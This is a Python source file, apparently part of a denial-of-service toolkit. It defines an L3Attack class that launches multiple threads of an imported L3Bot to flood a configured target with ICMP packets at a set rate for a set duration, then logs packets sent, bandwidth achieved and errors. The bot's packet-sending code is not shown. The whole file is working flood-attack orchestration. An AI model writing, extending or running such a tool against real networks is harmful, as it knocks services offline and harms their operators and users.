import time, datetime
from pathlib import Path
from ddos.bots.l3_bot import L3Bot
from utils.utils import save_jsonl, load_json

ddos_config = load_json(Path(__file__).resolve().parents[2] / "config/l3ddos.json")
LOGS = Path(__file__).resolve().parents[2] / "logs/l3attack.jsonl"
DURATION = ddos_config["l3"]["DURATION"]
MEGABITS_DIVISOR = 1_000_000.0


class L3Attack:
    def __init__(self, pps: int | None = None):
        self.duration = DURATION
        self.pps = pps
        self.stats = {
            "packets_sent": 0,
            "bytes_send": 0,
            "pps_achieved": 0,
            "mbps": 0,
            "errors_count": 0
        }

    def attack(self, num_threads: int = 4):
        print(f"⏳ L3 ICMP Attack is running...")
        start_time = time.time()
        stop_time = time.time() + self.duration

        bots = []
        for i in range(num_threads):
            bot = L3Bot(stop_time=stop_time, num=i, pps=self.pps)
            bots.append(bot)
            bot.start()
        for bot in bots:
            bot.join()
            self.stats["packets_sent"] += bot.local_packets_sent
            self.stats["bytes_send"] += bot.local_bytes_sent
            self.stats["errors_count"] += bot.local_errors_count

        print("✅ L3 ICMP Attack finished.")
        total_duration = time.time() - start_time
        self.attack_statistic_save(thrds_num=num_threads, total_duration=total_duration)
        self.attack_statistic_clear()

    def attack_statistic_save(self, thrds_num: int, total_duration):
        if total_duration > 0:
            self.stats["pps_achieved"] = self.stats["packets_sent"] / total_duration
            self.stats["mbps"] = (self.stats["bytes_send"] * 8) / (total_duration * MEGABITS_DIVISOR)

        logs = {
            f"{datetime.datetime.now():%Y-%m-%d %H:%M:%S.%f}": {
                "---PARAMS---": {
                    "Pps lim": self.pps,
                    "Threads number": thrds_num
                },
                "---STATS---": {
                    "Packets Sent": self.stats["packets_sent"],
                    "Bytes Sent": self.stats["bytes_send"],
                    "Pps": round(self.stats["pps_achieved"], 2),
                    "Mbps": round(self.stats["mbps"], 4),
                    "Errors": self.stats["errors_count"]
                }
            }
        }
        save_jsonl(LOGS, logs, show=True)

    def attack_statistic_clear(self):
        self.stats = {
            "packets_sent": 0,
            "bytes_send": 0,
            "pps_achieved": 0,
            "mbps": 0,
            "errors_count": 0
        }